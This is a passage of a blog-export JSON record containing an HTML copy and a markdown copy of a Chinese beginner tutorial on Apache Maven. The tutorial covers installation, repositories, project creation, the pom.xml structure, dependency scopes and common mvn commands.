			"content":"<ul>\n<li>转载自<a href=\"http://my.oschina.net/huangyong/blog/194583\">oschina</a>.</li>\n</ul>\n\n<h1 id=\"0-前言\">0. 前言</h1>\n\n<blockquote>\n  <p>Jason Van Zyl，在 Java 十大风云人物排行榜上或许会看到他。  这兄弟是干嘛的？  <br>\n   他就是 Maven 的创始人，人们都尊称他为“Maven 他爸”。  <br>\n   毋庸置疑，Jason 也是一个秃顶。James Gosling、Rod Johnson、Gavin King，你们可以告诉我为什么吗？ </p>\n</blockquote>\n\n<p>您曾经是否会遇到这些<strong><em>问题： </em></strong></p>\n\n<ul>\n<li><p>我们要开发一个 Java 项目，为了保证编译通过，我们会到处去寻找 jar 包。当编译通过了，在运行的时候，却发现 ClassNotFoundException，卧槽！还差 jar 包啊？再去找找吧。</p></li>\n<li><p>每个 Java 项目的目录结构都没有一个统一的标准，配置文件到处都是，单元测试代码到底应该放在哪里，没有一个权威的规范。</p></li>\n<li><p>可使用 Ant 做为项目构建工具，它可以自动化地完成编译、测试、打包等任务，确实为我们省了不少事儿，但编写 Ant 的 XML 脚本绝非是一件轻松的事情。</p></li>\n</ul>\n\n<p>有了 Maven，以上这一切都不再是问题了。</p>\n\n<p>Jason 就是 Java 开发规范的“救世主”！他给我们带来了一种全新的项目构建方式，让我们的开发工作更加高效。</p>\n\n<p>不仅如此，Jason 还是一名“野心家”，他不仅希望每个 Java 开发者都能使用他定义的规范，还要我们都从他家里去获取 jar 包（他家就是 Maven 中央仓库），我们只需告诉他，我们想要的 jar 包具体在什么位置即可（这个位置就是 Maven 坐标）。</p>\n\n<p>看来 Jason 要做的是两件事情： </p>\n\n<ol>\n<li><p>统一开发规范与工具</p></li>\n<li><p>统一管理 jar 包</p>\n\n<p>这两件事情他都做到了，而且还做了更多的事情。 </p>\n\n<p>工欲善其事，必先利其器。咱们也来玩玩 Maven 这货吧！先得去下载一个。 </p></li>\n</ol>\n\n<h1 id=\"1-安装-maven\">1. 安装 Maven</h1>\n\n<p>Maven 是 Apache 基金会的顶级项目，一般情况下，被 Apache 看中的都不会是烂货。 </p>\n\n<p>我们可以从 <a href=\"http://maven.apache.org/\">http://maven.apache.org/</a> 下载 Maven 开发包，其实就是一个压缩包，下载完毕后，解压一下，配置一下环境变量就可以用了。真是超简单！ </p>\n\n<p>假设我们刚刚下载了一个 apache-maven-3.1.1-bin.zip 文件，现在将其解压到 D:/tool 目录下 。我们不妨将解压后的目录重命名为 Maven，这样Maven 的根目录就是 D:/tool/maven 了。</p>\n\n<p>有两个环境变量可以配置：</p>\n\n<ul>\n<li><p>M2_HOME = D:/tool/maven</p></li>\n<li><p>MAVEN_OPTS = -Xms128m -Xmx512m</p>\n\n<p>以上 M2_HOME 是必须要配置的，如果想让 Maven 跑得更快点，可以根据自己的情况来设置 MAVEN_OPTS。 </p>\n\n<p>现在我们可以打开 cmd，输入： </p></li>\n</ul>\n\n<p><strong>mvn -v</strong></p>\n\n<p>我想您一定会看到一些信息，恭喜您，Maven 安装成功！ </p>\n\n<p>在使用 Maven 之前，很有必要了解一下 Maven 到底是怎样管理 jar 包的，这就是 Maven 仓库要干的活了。 </p>\n\n\n\n<h1 id=\"2-了解-maven-仓库\">2. 了解 Maven 仓库</h1>\n\n<p>使用 Maven 给我们带来的最直接的帮助，就是 jar 包得到了统一管理，那么这些 jar 包存放在哪里呢？它们就在您的 <strong>本地仓库 </strong>中，位于 C:\\Users\\用户名.m2 目录下（当然也可以修改这个默认地址）。</p>\n\n<p>实际上可将本地仓库理解“缓存”，因为项目首先会从本地仓库中获取 jar 包，当无法获取指定 jar 包的时候，本地仓库会从 <strong>远程<em>*</em></strong>仓库（或 中央仓库）* 中下载 jar 包，并放入本地仓库中以备将来使用。这个远程仓库是 Maven 官方提供的，可通过 <a href=\"http://search.maven.org/\">http://search.maven.org/</a> 来访问。这样一来，本地仓库会随着项目的积累越来越大。通过下面这张图可以清晰地表达项目、本地仓库、远程仓库之间的关系。</p>\n\n<p><img src=\"http://static.oschina.net/uploads/space/2014/0120/222601_cKl0_223750.png\" alt=\"\" title=\"\"></p>\n\n<p>这个结构是否与 Git 的本地仓库与远程仓库有异曲同工之妙呢？</p>\n\n<p>既然 Maven 安装了，那么本地仓库也就有了，下面我们就一起来创建一个 Maven 项目吧。 </p>\n\n\n\n<h1 id=\"3-创建-maven-项目\">3. 创建 Maven 项目</h1>\n\n<p>我们不妨创建一个 Java Web 项目，只需在 cmd 中输入： </p>\n\n<p><strong>mvn archetype:generate</strong></p>\n\n<p>随后 Maven 将下载 Archetype 插件及其所有的依赖插件，这些插件其实都是 jar 包，它们存放在您的 Maven 本地仓库中。 </p>\n\n<p>在 cmd 中，您会看到几百个 <strong>Archetype（原型）</strong>，可将它理解为项目模板，您得从中选择一个。 </p>\n\n<p>我们的目标是创建 Java Web 项目，所以您可以选择 maven-archetype-webapp（可以在 cmd 中进行模糊搜索），随后 Maven 会与您进行一些对话，Maven 想知道以下信息： </p>\n\n<ul>\n<li><p>项目 Archetype Version（原型版本号）是什么？—— 可选择 1.0 版本</p></li>\n<li><p>项目 groupId（组织名） 是什么？—— 可输入 com.smart</p></li>\n<li><p>项目 artifactId（构件名）是什么？—— 可输入 smart-demo</p></li>\n<li><p>项目 version（版本号）是什么？—— 可输入 1.0</p></li>\n<li><p>项目 package（包名）是什么？—— 可输入 com.smart.demo</p></li>\n</ul>\n\n<p>以上这种方式称为 <strong>Interactive Mode**</strong>（交互模式）**。</p>\n\n<p>如果您是一位高效人士，或许觉得这样的交互过于繁琐，那么您也可以尝试仅使用一条命名，来完成同样的事情：</p>\n\n<p><strong>mvn archetype:generate -DinteractiveMode=false -DarchetypeArtifactId=maven-archetype-webapp -DgroupId=com.smart -DartifactId=smart-demo -Dversion=1.0</strong></p>\n\n<p>以上这种方式成为 <strong>Batch Mode**</strong>（批处理模式）**。 </p>\n\n<p>当然，还有第三种选择，使用 IDE 来创建 Maven 项目，您可以使用 Eclipse、NetBeans、IDEA 来创建 Maven 项目，操作过程应该是非常简单的。 </p>\n\n<p>您也可以使用 IDEA 直接打开一个 Maven 项目，只需要 File -&gt; Open -&gt; 选择 pom.xml，那么下面您就可以在 IDEA 中开发 Maven 项目了，贴一张图片吧： </p>\n\n<p><img src=\"http://static.oschina.net/uploads/space/2014/0118/224720_DNpK_223750.png\" alt=\"\" title=\"\"></p>\n\n<p>其实这个目录结构还不太完备，我们需要手工添加几个目录上去，最终的目录结构看起来是这样的： </p>\n\n<p><img src=\"http://static.oschina.net/uploads/space/2014/0118/225115_hglq_223750.png\" alt=\"\" title=\"\"></p>\n\n<p>我们手工创建了三个目录： </p>\n\n<ol>\n<li><p>src/main/java</p></li>\n<li><p>src/test/java</p></li>\n<li><p>src/test/resources</p>\n\n<p>为什么自动生成的目录不完备？确实挺无语的，我们就不要去纠结了。不过有必要稍微解释一下这个 Maven 目录规范： </p>\n\n<ul><li><p>main 目录下是项目的主要代码，test 目录下存放测试相关的代码。</p></li>\n<li><p>编译输出后的代码会放在target 目录下（该目录与 src 目录在同一级别下，这里没有显示出来）。 </p></li>\n<li><p>java 目录下存放 Java 代码，resources 目录下存放配置文件。</p></li>\n<li><p>webapp 目录下存放 Web 应用相关代码。 </p></li>\n<li><p>pom.xml 是 Maven 项目的配置文件。 </p></li></ul></li>\n</ol>\n\n<p>其中 pom.xml 称为 <strong>Project Object Model（项目对象模型）</strong>，它用于描述整个 Maven 项目，所以也称为 Maven 描述文件。</p>\n\n<p>可见 pom.xml 才是理解 Maven 的关键点，很有必要看看它到底长什么样。 </p>\n\n\n\n<h1 id=\"4-理解-pomxml\">4. 理解 pom.xml</h1>\n\n<p>当 您打开自动生成的 pom.xml，或许会感觉到可读性不太好，有必要做一下格式化，经过整理后是这样的： </p>\n\n<pre><code>&lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0\n         http://maven.apache.org/maven-v4_0_0.xsd\"&gt;\n\n    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;\n\n    &lt;groupId&gt;com.smart&lt;/groupId&gt;\n    &lt;artifactId&gt;smart-demo&lt;/artifactId&gt;\n    &lt;version&gt;1.0&lt;/version&gt;\n    &lt;packaging&gt;war&lt;/packaging&gt;\n\n    &lt;name&gt;smart-demo Maven Webapp&lt;/name&gt;\n    &lt;url&gt;http://maven.apache.org&lt;/url&gt;\n\n    &lt;dependencies&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;junit&lt;/groupId&gt;\n            &lt;artifactId&gt;junit&lt;/artifactId&gt;\n            &lt;version&gt;3.8.1&lt;/version&gt;\n            &lt;scope&gt;test&lt;/scope&gt;\n        &lt;/dependency&gt;\n    &lt;/dependencies&gt;\n\n    &lt;build&gt;\n        &lt;finalName&gt;smart-demo&lt;/finalName&gt;\n    &lt;/build&gt;&lt;/project&gt;\n</code></pre>\n\n<p>从上往下简要说明一下： </p>\n\n<ul>\n<li><p>modelVersion：这个是 POM 的版本号，现在都是 4.0.0 的，必须得有，但不需要修改。</p></li>\n<li><p>groupId、artifactId、version：分别表示 Maven 项目的组织名、构件名、版本号，它们三个合起来就是 <strong>Maven **</strong>坐标<strong>，根据这个坐标可以在 Maven 仓库中对应唯一的 **Maven 构件</strong>。</p></li>\n<li><p>packaging：表示该项目的打包方式，war 表示打包为 war 文件，默认为 jar，表示打包为 jar 文件。</p></li>\n<li><p>name、url：表示该项目的名称与 URL 地址，意义不大，可以省略。</p></li>\n<li><p>dependencies：定义该项目的依赖关系，其中每一个 dependency 对应一个 Maven 项目，可见 Maven 坐标再次出现，还多了一个 scope，表示作用域（下面会描述）。</p></li>\n<li><p>build：表示与构建相关的配置，这里的 finalName 表示最终构建后的名称 smart-demo.war，这里的 finalName 还可以使用另一种方式来定义（下面会描述）。</p>\n\n<p>如果用树形图来表达 pom.xml，那么会更加清晰： </p></li>\n</ul>\n\n<p><img src=\"http://static.oschina.net/uploads/space/2014/0118/232122_X0cM_223750.png\" alt=\"\" title=\"\"></p>\n\n<p>可见，除了项目的基本信息（Maven 坐标、打包方式等）以外，每个 pom.xml 都应该包括： </p>\n\n<ol>\n<li><p>Lifecycle（生命周期）</p></li>\n<li><p>Plugins（插件）</p></li>\n<li><p>Dependencies（依赖）</p>\n\n<p>Lifecycle 是项目构建的生命周期，它包括 9 个 Phase（阶段）。 </p>\n\n<p>大家知道，Maven 是一个核心加上多个插件的架构，而这些插件提供了一系列非常重要的功能，这些插件会在许多阶段里发挥重要作用。  <br>\n<strong>阶段<em>*</em></strong>插件<strong>*作用</strong> clean <br>\nclean  清理自动生成的文件，也就是 target 目录 <br>\nvalidate <br>\n由 Maven 核心负责  验证 Maven 描述文件是否有效 <br>\ncompile <br>\ncompiler、resources  编译 Java 源码 <br>\ntest <br>\ncompiler、surefire、resources  运行测试代码 <br>\npackage <br>\nwar  项目打包，就是生成构件包，也就是打 war 包 <br>\nverify <br>\n由 Maven 核心负责 <br>\n验证构件包是否有效 <br>\ninstall <br>\ninstall  将构件包安装到本地仓库 <br>\nsite <br>\nsite  生成项目站点，就是一堆静态网页文件，包括 JavaDoc <br>\ndeploy <br>\ndeploy  将构件包部署到远程仓库</p>\n\n<p>以上表格中所出现的插件名称实际上是插件的别名（或称为前缀），比如：compiler 实际上是 org.apache.maven.plugins:maven-compiler-plugin:2.3.2，这个才是 Maven 插件的完全名称。 </p>\n\n<p>每个插件又包括了一些列的 <strong>Goal（目标）</strong>，以 compiler 插件为例，它包括以下目标： </p>\n\n<ul><li><p>compiler:help：用于显示 compiler 插件的使用帮助。</p></li>\n<li><p>compiler:compile：用于编译 main 目录下的 Java 代码。</p></li>\n<li><p>compiler:testCompile：用于编译 test 目录下的 Java 代码。</p></li></ul>\n\n<p>可见，插件目标才是具体干活的人，一个插件包括了一个多个目标，一个阶段可由零个或多个插件来提供支持。 </p>\n\n<p>我们可以在 pom.xml 中定义一些列的项目依赖（构件包），每个构件包都会有一个 <strong>Scope（作用域）</strong>，它表示该构件包在什么时候起作用，包括以下五种： </p></li>\n<li><p>compile：默认作用域，在编译、测试、运行时有效</p></li>\n<li><p>test：对于测试时有效 </p></li>\n<li><p>runtime：对于测试、运行时有效 </p></li>\n<li><p>provided：对于编译、测试时有效，但在运行时无效 </p></li>\n<li><p>system：与 provided 类似，但依赖于系统资源 </p></li>\n</ol>\n\n<p>可用一张矩阵表格来表示：</p>\n\n<table>\n<thead>\n<tr>\n  <th>作用域</th>\n  <th align=\"center\">编译时有效</th>\n  <th align=\"center\">测试时有效</th>\n  <th align=\"center\">运行时有效</th>\n  <th align=\"center\">示例</th>\n</tr>\n</thead>\n<tbody><tr>\n  <td>compile</td>\n  <td align=\"center\"><strong>√</strong></td>\n  <td align=\"center\"><strong>√</strong></td>\n  <td align=\"center\"><strong>√</strong></td>\n  <td align=\"center\"></td>\n</tr>\n<tr>\n  <td>smart-framework.jar</td>\n  <td align=\"center\"></td>\n  <td align=\"center\"></td>\n  <td align=\"center\"></td>\n  <td align=\"center\"></td>\n</tr>\n<tr>\n  <td>test</td>\n  <td align=\"center\"><strong>√</strong></td>\n  <td align=\"center\"></td>\n  <td align=\"center\"></td>\n  <td align=\"center\"></td>\n</tr>\n<tr>\n  <td>junit.jar</td>\n  <td align=\"center\"></td>\n  <td align=\"center\"></td>\n  <td align=\"center\"></td>\n  <td align=\"center\"></td>\n</tr>\n<tr>\n  <td>runtime</td>\n  <td align=\"center\"><strong>√</strong></td>\n  <td align=\"center\"><strong>√</strong></td>\n  <td align=\"center\"></td>\n  <td align=\"center\"></td>\n</tr>\n<tr>\n  <td>mysql-connector-java.jar</td>\n  <td align=\"center\"></td>\n  <td align=\"center\"></td>\n  <td align=\"center\"></td>\n  <td align=\"center\"></td>\n</tr>\n<tr>\n  <td>provided</td>\n  <td align=\"center\"><strong>√</strong></td>\n  <td align=\"center\"><strong>√</strong></td>\n  <td align=\"center\"></td>\n  <td align=\"center\"></td>\n</tr>\n<tr>\n  <td>servlet-api.jar</td>\n  <td align=\"center\"></td>\n  <td align=\"center\"></td>\n  <td align=\"center\"></td>\n  <td align=\"center\"></td>\n</tr>\n<tr>\n  <td>system</td>\n  <td align=\"center\"><strong>√</strong></td>\n  <td align=\"center\"><strong>√</strong></td>\n  <td align=\"center\"></td>\n  <td align=\"center\"></td>\n</tr>\n</tbody></table>\n\n\n<p>JDK 的 rt.jar</p>\n\n<p>如果您想开发一个 Smart 应用，可参考如下 pom.xml：</p>\n\n<pre><code>&lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0\n         http://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt;\n\n    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;\n\n    &lt;properties&gt;\n        &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;\n        &lt;smart.version&gt;1.0&lt;/smart.version&gt;\n    &lt;/properties&gt;\n\n    &lt;groupId&gt;com.smart&lt;/groupId&gt;\n    &lt;artifactId&gt;smart-demo&lt;/artifactId&gt;\n    &lt;version&gt;1.0&lt;/version&gt;\n    &lt;packaging&gt;war&lt;/packaging&gt;\n\n    &lt;dependencies&gt;\n        &lt;!-- JUnit --&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;junit&lt;/groupId&gt;\n            &lt;artifactId&gt;junit&lt;/artifactId&gt;\n            &lt;version&gt;4.11&lt;/version&gt;\n            &lt;scope&gt;test&lt;/scope&gt;\n        &lt;/dependency&gt;\n        &lt;!-- MySQL --&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;mysql&lt;/groupId&gt;\n            &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;\n            &lt;version&gt;5.1.25&lt;/version&gt;\n            &lt;scope&gt;runtime&lt;/scope&gt;\n        &lt;/dependency&gt;\n        &lt;!-- Servlet --&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;javax.servlet&lt;/groupId&gt;\n            &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt;\n            &lt;version&gt;3.0.1&lt;/version&gt;\n            &lt;scope&gt;provided&lt;/scope&gt;\n        &lt;/dependency&gt;\n        &lt;!-- JSTL --&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;javax.servlet&lt;/groupId&gt;\n            &lt;artifactId&gt;jstl&lt;/artifactId&gt;\n            &lt;version&gt;1.2&lt;/version&gt;\n            &lt;scope&gt;runtime&lt;/scope&gt;\n        &lt;/dependency&gt;\n        &lt;!-- Smart --&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;com.smart&lt;/groupId&gt;\n            &lt;artifactId&gt;smart-framework&lt;/artifactId&gt;\n            &lt;version&gt;${smart.version}&lt;/version&gt;\n        &lt;/dependency&gt;\n    &lt;/dependencies&gt;\n\n    &lt;build&gt;\n        &lt;plugins&gt;\n            &lt;!-- Compile --&gt;\n            &lt;plugin&gt;\n                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;\n                &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;\n                &lt;version&gt;2.5.1&lt;/version&gt;\n                &lt;configuration&gt;\n                    &lt;source&gt;1.6&lt;/source&gt;\n                    &lt;target&gt;1.6&lt;/target&gt;\n                &lt;/configuration&gt;\n            &lt;/plugin&gt;\n            &lt;!-- Test --&gt;\n            &lt;plugin&gt;\n                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;\n                &lt;artifactId&gt;maven-surefire-plugin&lt;/artifactId&gt;\n                &lt;version&gt;2.15&lt;/version&gt;\n                &lt;configuration&gt;\n                    &lt;skipTests&gt;true&lt;/skipTests&gt;\n                &lt;/configuration&gt;\n            &lt;/plugin&gt;\n            &lt;!-- Package --&gt;\n            &lt;plugin&gt;\n                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;\n                &lt;artifactId&gt;maven-war-plugin&lt;/artifactId&gt;\n                &lt;version&gt;2.4&lt;/version&gt;\n                &lt;configuration&gt;\n                    &lt;warName&gt;${project.artifactId}&lt;/warName&gt;\n                &lt;/configuration&gt;\n            &lt;/plugin&gt;\n            &lt;!-- Tomcat --&gt;\n            &lt;plugin&gt;\n                &lt;groupId&gt;org.apache.tomcat.maven&lt;/groupId&gt;\n                &lt;artifactId&gt;tomcat7-maven-plugin&lt;/artifactId&gt;\n                &lt;version&gt;2.2&lt;/version&gt;\n            &lt;/plugin&gt;\n        &lt;/plugins&gt;\n    &lt;/build&gt;&lt;/project&gt;\n</code></pre>\n\n<p>以上 pom.xml 大致解释一下：</p>\n\n<ul>\n<li><p>我们可使用 properties 来定义一些配置属性，例如：project.build.sourceEncoding（项目构建源码编码方式），可设置为 UTF-8，可防止中文乱码。也可定义相关构件包版本号，例如：smart.version，便于日后统一升级。</p></li>\n<li><p>建议使用最新版本的 JUnit，通过 Archetype 自动生成的 JUnit 太老了（3.8.1），可改为最新版（4.11）。</p></li>\n<li><p>因为没必要使用 MySQL 客户端的 API，它仅仅在运行时有效，所以我们将 MySQL 构件包的作用域设置为 runtime。</p></li>\n<li><p>因为我们只想在代码中使用 Servlet API，而不想将它所对应的 jar 包放入 WEB-INF 的 lib 目录下，所以我们可设置 Servlet 构件包的作用域为 provided。</p></li>\n<li><p>为了保证在 JDK 1.6 运行，我们可配置 maven-compiler-plugin 插件，设置输入源码为 1.6，编译输出的字节码也为 1.6。</p></li>\n<li><p>如果想跳过测试，可配置 maven-surefire-plugin 插件，将 skipTests 设置为 true。</p></li>\n<li><p>如果想配置生成的 war 包为 artifactId，可修改 maven-war-plugin 插件，将 warName 修改为 ${project.artifactId}，这样就无需再配置 finalName 了。</p></li>\n<li><p>如果想通过 Maven 将应用部署到 Tomcat 中，可使用 tomcat7-maven-plugin 插件，可使用 mvn tomcat7:run-war 命令来运行 war 包。</p></li>\n</ul>\n\n<h1 id=\"5-使用-maven-命令\">5. 使用 Maven 命令</h1>\n\n<p>前面我们已经使用了几个 Maven 命令，例如：mvn archetype:generate，mvn tomcat7:run-war 等。其实，可使用两种不同的方式来执行 Maven 命令： </p>\n\n<p>方式一：<strong>mvn &lt;插件&gt;:&lt;目标&gt; [参数]</strong></p>\n\n<p>方式二：<strong>mvn &lt;阶段&gt;</strong></p>\n\n<p>现在我们接触到的都是第一种方式，而第二种方式才是我们日常中使用最频繁的，例如： </p>\n\n<ul>\n<li><p><strong>mvn clean</strong>：清空输出目录（即 target 目录）</p></li>\n<li><p><strong>mvn compile</strong>：编译源代码</p></li>\n<li><p><strong>mvn package</strong>：生成构件包（一般为 jar 包或 war 包）</p></li>\n<li><p><strong>mvn install</strong>：将构件包安装到本地仓库</p></li>\n<li><p><strong>mvn deploy</strong>：将构件包部署到远程仓库</p></li>\n</ul>\n\n<p>执行 Maven 命令需要注意的是：必须在 Maven 项目的根目录处执行，也就是当前目录下一定存在一个名为 pom.xml 的文件。</p>\n\n\n\n<h1 id=\"6-后记\">6. 后记</h1>\n\n<p>Maven 使 Java 开发更加规范化与自动化，其实 Maven 那点事远远不止这些，如果您掌握了以上这些基础知识，再去学习 Maven 的高级特性，我想一定会是一件非常轻松的事情。 </p>\n\n<p>推荐大家使用 <a href=\"http://maven.oschina.net/\">OSC Maven</a>，它是国内 Maven 的镜像站点，使用它可加快构件包的下载速度，从而提升您的开发效率，可阅读《<a href=\"http://my.oschina.net/huangyong/blog/180189\">使用 OSC Maven 仓库</a>》这篇文章来学会如何使用 OSC Maven。 </p>\n\n<p>感谢您阅读本文，感谢您对“<a href=\"http://my.oschina.net/huangyong/blog/161419\">Java 那点事儿</a>”与“<a href=\"http://my.oschina.net/huangyong/blog/158380\">Smart Framework</a>”的支持与鼓励！ </p>",
			"markdowncontent":"* 转载自[oschina](http://my.oschina.net/huangyong/blog/194583).\n#  0. 前言 \n\n> Jason Van Zyl，在 Java 十大风云人物排行榜上或许会看到他。  这兄弟是干嘛的？ \n 他就是 Maven 的创始人，人们都尊称他为“Maven 他爸”。 \n 毋庸置疑，Jason 也是一个秃顶。James Gosling、Rod Johnson、Gavin King，你们可以告诉我为什么吗？ \n\n 您曾经是否会遇到这些***问题： ***\n\n- \n我们要开发一个 Java 项目，为了保证编译通过，我们会到处去寻找 jar 包。当编译通过了，在运行的时候，却发现 ClassNotFoundException，卧槽！还差 jar 包啊？再去找找吧。\n\n- \n每个 Java 项目的目录结构都没有一个统一的标准，配置文件到处都是，单元测试代码到底应该放在哪里，没有一个权威的规范。\n\n- \n可使用 Ant 做为项目构建工具，它可以自动化地完成编译、测试、打包等任务，确实为我们省了不少事儿，但编写 Ant 的 XML 脚本绝非是一件轻松的事情。\n\n有了 Maven，以上这一切都不再是问题了。\n\nJason 就是 Java 开发规范的“救世主”！他给我们带来了一种全新的项目构建方式，让我们的开发工作更加高效。\n\n不仅如此，Jason 还是一名“野心家”，他不仅希望每个 Java 开发者都能使用他定义的规范，还要我们都从他家里去获取 jar 包（他家就是 Maven 中央仓库），我们只需告诉他，我们想要的 jar 包具体在什么位置即可（这个位置就是 Maven 坐标）。\n\n 看来 Jason 要做的是两件事情： \n\n1. \n统一开发规范与工具\n\n2. \n统一管理 jar 包\n\n 这两件事情他都做到了，而且还做了更多的事情。 \n\n 工欲善其事，必先利其器。咱们也来玩玩 Maven 这货吧！先得去下载一个。 \n\n#  1. 安装 Maven \n\n Maven 是 Apache 基金会的顶级项目，一般情况下，被 Apache 看中的都不会是烂货。 \n\n 我们可以从 [http://maven.apache.org/](http://maven.apache.org/) 下载 Maven 开发包，其实就是一个压缩包，下载完毕后，解压一下，配置一下环境变量就可以用了。真是超简单！ \n\n 假设我们刚刚下载了一个 apache-maven-3.1.1-bin.zip 文件，现在将其解压到 D:/tool 目录下 。我们不妨将解压后的目录重命名为 Maven，这样Maven 的根目录就是 D:/tool/maven 了。\n\n有两个环境变量可以配置：\n\n- \nM2_HOME = D:/tool/maven\n\n- \nMAVEN_OPTS = -Xms128m -Xmx512m\n\n 以上 M2_HOME 是必须要配置的，如果想让 Maven 跑得更快点，可以根据自己的情况来设置 MAVEN_OPTS。 \n\n 现在我们可以打开 cmd，输入： \n\n**mvn -v**\n\n 我想您一定会看到一些信息，恭喜您，Maven 安装成功！ \n\n 在使用 Maven 之前，很有必要了解一下 Maven 到底是怎样管理 jar 包的，这就是 Maven 仓库要干的活了。 \n\n#  2. 了解 Maven 仓库 \n\n 使用 Maven 给我们带来的最直接的帮助，就是 jar 包得到了统一管理，那么这些 jar 包存放在哪里呢？它们就在您的 **本地仓库 **中，位于 C:\\Users\\用户名\\.m2 目录下（当然也可以修改这个默认地址）。\n\n实际上可将本地仓库理解“缓存”，因为项目首先会从本地仓库中获取 jar 包，当无法获取指定 jar 包的时候，本地仓库会从 **远程****仓库（或 中央仓库）** 中下载 jar 包，并放入本地仓库中以备将来使用。这个远程仓库是 Maven 官方提供的，可通过 [http://search.maven.org/](http://search.maven.org/) 来访问。这样一来，本地仓库会随着项目的积累越来越大。通过下面这张图可以清晰地表达项目、本地仓库、远程仓库之间的关系。\n\n![](http://static.oschina.net/uploads/space/2014/0120/222601_cKl0_223750.png)\n\n这个结构是否与 Git 的本地仓库与远程仓库有异曲同工之妙呢？\n\n 既然 Maven 安装了，那么本地仓库也就有了，下面我们就一起来创建一个 Maven 项目吧。 \n\n#  3. 创建 Maven 项目 \n\n 我们不妨创建一个 Java Web 项目，只需在 cmd 中输入： \n\n**mvn archetype:generate**\n\n 随后 Maven 将下载 Archetype 插件及其所有的依赖插件，这些插件其实都是 jar 包，它们存放在您的 Maven 本地仓库中。 \n\n 在 cmd 中，您会看到几百个 **Archetype（原型）**，可将它理解为项目模板，您得从中选择一个。 \n\n 我们的目标是创建 Java Web 项目，所以您可以选择 maven-archetype-webapp（可以在 cmd 中进行模糊搜索），随后 Maven 会与您进行一些对话，Maven 想知道以下信息： \n\n- \n项目 Archetype Version（原型版本号）是什么？—— 可选择 1.0 版本\n\n- \n项目 groupId（组织名） 是什么？—— 可输入 com.smart\n\n- \n项目 artifactId（构件名）是什么？—— 可输入 smart-demo\n\n- \n项目 version（版本号）是什么？—— 可输入 1.0\n\n- \n项目 package（包名）是什么？—— 可输入 com.smart.demo\n\n以上这种方式称为 **Interactive Mode****（交互模式）**。\n\n如果您是一位高效人士，或许觉得这样的交互过于繁琐，那么您也可以尝试仅使用一条命名，来完成同样的事情：\n\n**mvn archetype:generate -DinteractiveMode=false -DarchetypeArtifactId=maven-archetype-webapp -DgroupId=com.smart -DartifactId=smart-demo -Dversion=1.0**\n\n 以上这种方式成为 **Batch Mode****（批处理模式）**。 \n\n 当然，还有第三种选择，使用 IDE 来创建 Maven 项目，您可以使用 Eclipse、NetBeans、IDEA 来创建 Maven 项目，操作过程应该是非常简单的。 \n\n 您也可以使用 IDEA 直接打开一个 Maven 项目，只需要 File -> Open -> 选择 pom.xml，那么下面您就可以在 IDEA 中开发 Maven 项目了，贴一张图片吧： \n\n![](http://static.oschina.net/uploads/space/2014/0118/224720_DNpK_223750.png)\n   \n\n 其实这个目录结构还不太完备，我们需要手工添加几个目录上去，最终的目录结构看起来是这样的： \n\n![](http://static.oschina.net/uploads/space/2014/0118/225115_hglq_223750.png)\n\n 我们手工创建了三个目录： \n\n1. \nsrc/main/java\n\n2. \nsrc/test/java\n\n3. \nsrc/test/resources\n\n 为什么自动生成的目录不完备？确实挺无语的，我们就不要去纠结了。不过有必要稍微解释一下这个 Maven 目录规范： \n\n- \nmain 目录下是项目的主要代码，test 目录下存放测试相关的代码。\n\n- \n 编译输出后的代码会放在target 目录下（该目录与 src 目录在同一级别下，这里没有显示出来）。 \n\n- \njava 目录下存放 Java 代码，resources 目录下存放配置文件。\n\n- \n webapp 目录下存放 Web 应用相关代码。 \n\n- \n pom.xml 是 Maven 项目的配置文件。 \n\n其中 pom.xml 称为 **Project Object Model（项目对象模型）**，它用于描述整个 Maven 项目，所以也称为 Maven 描述文件。\n\n 可见 pom.xml 才是理解 Maven 的关键点，很有必要看看它到底长什么样。 \n\n#  4. 理解 pom.xml \n\n 当 您打开自动生成的 pom.xml，或许会感觉到可读性不太好，有必要做一下格式化，经过整理后是这样的： \n\n    <project xmlns=\"http://maven.apache.org/POM/4.0.0\"\n             xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n             xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0\n             http://maven.apache.org/maven-v4_0_0.xsd\">\n    \n        <modelVersion>4.0.0</modelVersion>\n    \n        <groupId>com.smart</groupId>\n        <artifactId>smart-demo</artifactId>\n        <version>1.0</version>\n        <packaging>war</packaging>\n    \n        <name>smart-demo Maven Webapp</name>\n        <url>http://maven.apache.org</url>\n    \n        <dependencies>\n            <dependency>\n                <groupId>junit</groupId>\n                <artifactId>junit</artifactId>\n                <version>3.8.1</version>\n                <scope>test</scope>\n            </dependency>\n        </dependencies>\n    \n        <build>\n            <finalName>smart-demo</finalName>\n        </build></project>\n\n 从上往下简要说明一下： \n\n- \nmodelVersion：这个是 POM 的版本号，现在都是 4.0.0 的，必须得有，但不需要修改。\n\n- \ngroupId、artifactId、version：分别表示 Maven 项目的组织名、构件名、版本号，它们三个合起来就是 **Maven ****坐标**，根据这个坐标可以在 Maven 仓库中对应唯一的 **Maven 构件**。\n\n- \npackaging：表示该项目的打包方式，war 表示打包为 war 文件，默认为 jar，表示打包为 jar 文件。\n\n- \nname、url：表示该项目的名称与 URL 地址，意义不大，可以省略。\n\n- \ndependencies：定义该项目的依赖关系，其中每一个 dependency 对应一个 Maven 项目，可见 